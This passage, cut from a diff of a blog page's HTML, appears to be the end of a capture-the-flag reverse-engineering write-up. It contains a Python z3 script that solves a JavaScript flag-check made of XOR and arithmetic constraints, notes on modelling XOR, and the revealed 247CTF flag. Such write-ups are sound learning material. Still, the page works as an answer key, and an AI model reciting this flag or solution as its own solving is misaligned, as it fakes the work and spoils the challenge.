class="string">(flag[37] * flag[24]) ^ (flag[12] - flag[39] == -5726) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[29] + flag[3]) ^ (flag[8] + flag[11] == 195) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[26] * flag[7]) ^ (flag[10] - flag[17] == -2375) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[11] - flag[12]) * flag[12] == -4653 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[13] * flag[5]) ^ (flag[12] - flag[25] == 3829) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[24] * flag[0]) ^ (flag[13] - flag[23] == -2829) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[17] + flag[12]) ^ (flag[8] + flag[14] == 170) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[38] + flag[23]) ^ (flag[11] + flag[1] == 245) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[22] + flag[5]) ^ (flag[21] + flag[24] == 19) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[35] - flag[8] + flag[21]) ^ (flag[30] == 85) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[18] - flag[31] + flag[28]) ^ (flag[29] == 0) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[30] * flag[35]) ^ (flag[27] - flag[29] == 5501) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[8] - flag[30] + flag[16]) ^ (flag[36] == 81) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[13] * flag[18]) ^ (flag[35] - flag[38] == -2971) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[27] - flag[14]) * flag[39] == 5875 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[34] - flag[33]) * flag[6] == -6027 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[38] * flag[1]) ^ (flag[20] - flag[10] == -2915) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[1] - flag[1]) * flag[3] == 0 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[36] - flag[20]) * flag[8] == 2640 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[23] - flag[11] + flag[17]) ^ (flag[33] == 246) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[13] - flag[38]) * flag[0] == -100 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] - flag[14]) * flag[31] == 2142 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[26] + flag[15]) ^ (flag[13] + flag[31] == 8) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[36] - flag[15]) * flag[17] == 5238 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[16] - flag[30]) * flag[33] == 0 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[2] - flag[20] + flag[13]) ^ (flag[6] == 76) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[10] - flag[14] + flag[31]) ^ (flag[13] == 3) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[0] * flag[10]) ^ (flag[14] - flag[31] == 2854) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] - flag[34] + flag[14]) ^ (flag[14] == 82) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] - flag[25]) * flag[1] == 2444 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[34] - flag[12]) * flag[25] == -2400 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] * flag[38]) ^ (flag[17] - flag[4] == 5429) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[21] - flag[21] + flag[26]) ^ (flag[23] == 84) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[9] - flag[4] + flag[18]) ^ (flag[35] == 47) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] - flag[21] + flag[1]) ^ (flag[33] == 0) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[24] - flag[25] + flag[22]) ^ (flag[0] == 8) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] - flag[25]) * flag[12] == 4653 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[1] * flag[15]) ^ (flag[10] - flag[8] == 2498) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[5] * flag[7]) ^ (flag[15] - flag[34] == -3429) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[8] * flag[3]) ^ (flag[23] - flag[22] == 3671) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[25] - flag[33]) * flag[11] == -2600 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[21] + flag[12]) ^ (flag[37] + flag[28] == 81) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[30] + flag[33]) ^ (flag[34] + flag[14] == 162) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[6] - flag[25]) * flag[8] == 4015 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[24] - flag[7] + flag[12]) ^ (flag[7] == 90) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[18] * flag[12]) ^ (flag[8] - flag[4] == -5466) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] * flag[7]) ^ (flag[32] - flag[27] == -2730) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] * flag[34]) ^ (flag[29] - flag[16] == 2804) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[25] * flag[22]) ^ (flag[28] - flag[39] == -2542) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[8] - flag[15]) * flag[6] == 861 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[20] + flag[18]) ^ (flag[25] + flag[36] == 245) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[5] - flag[28] + flag[14]) ^ (flag[39] == 97) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[30] * flag[11]) ^ (flag[16] - flag[11] == 5216) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[11] + flag[18]) ^ (flag[7] + flag[9] == 13) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[9] - flag[2]) * flag[30] == -200 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[12] + flag[37]) ^ (flag[9] + flag[4] == 78) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[10] - flag[37]) * flag[38] == -2408 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[5] * flag[19]) ^ (flag[20] - flag[21] == 3645) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[27] * flag[29]) ^ (flag[39] - flag[21] == 10354) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[15] * flag[32]) ^ (flag[7] - flag[22] == -2642) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[1] - flag[3] + flag[24]) ^ (flag[31] == 25) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[13] - flag[0]) * flag[30] == 400 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[18] - flag[15] + flag[36]) ^ (flag[28] == 12) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[34] + flag[21]) ^ (flag[12] + flag[37] == 163) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[36] - flag[33]) * flag[14] == 110 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[2] - flag[3]) * flag[3] == -804 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[35] - flag[27] + flag[22]) ^ (flag[4] == 80) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[10] + flag[9]) ^ (flag[17] + flag[2] == 246) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[25] * flag[4]) ^ (flag[27] - flag[23] == 4201) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] * flag[19]) ^ (flag[3] - flag[25] == 2877) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[37] - flag[14]) * flag[23] == 4545 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] + flag[13]) ^ (flag[31] + flag[32] == 7) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[11] - flag[25]) * flag[39] == 250 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[17] + flag[31]) ^ (flag[6] + flag[9] == 36) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[4] + flag[27]) ^ (flag[2] + flag[31] == 208) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[6] + flag[7]) ^ (flag[26] + flag[21] == 206) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[19] + flag[25]) ^ (flag[22] + flag[10] == 10) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[34] + flag[2]) ^ (flag[8] + flag[26] == 2) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[7] + flag[5]) ^ (flag[12] + flag[14] == 237) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[1] - flag[13]) * flag[38] == -112 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[0] - flag[19] + flag[16]) ^ (flag[0] == 80) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[31] + flag[36]) ^ (flag[3] + flag[2] == 227) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] - flag[3] + flag[26]) ^ (flag[4] == 113) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[3] * flag[6]) ^ (flag[16] - flag[27] == -8241) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[24] + flag[15]) ^ (flag[2] + flag[30] == 242) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[11] + flag[21]) ^ (flag[31] + flag[20] == 12) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[9] - flag[26] + flag[23]) ^ (flag[30] == 13)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">f&quot;flag[<span class="subst">&#123;i&#125;</span>]&quot;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(flag[i] &gt;= <span class="number">32</span>, flag[i] &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> raw_js.strip().split(<span class="string">&quot;&amp;&amp;&quot;</span>):</span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Convert: A ^ (B == N)   -&gt;   (A ^ B) == N</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;^&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">        line = re.sub(<span class="string">r&quot;(.*)\^\s*\((.*)\s*==\s*(-?\d+)\)&quot;</span>, <span class="string">r&quot;(\1 ^ (\2)) == \3&quot;</span>, line)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="built_in">eval</span>(line))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(m[flag[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[-] Unsatisfiable.&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="notes">Notes</h2>
-<ul>
-<li><code>^</code> in JavaScript is bitwise XOR (not exponent), so
-constraints must be modeled as XOR equations.</li>
-<li>32-bit <code>BitVec</code> variables are used to match JavaScript
-bitwise operation behavior.</li>
-</ul>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{17594c670da74613e921faed37d37fd8}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/8/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/10/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/8/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/10/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
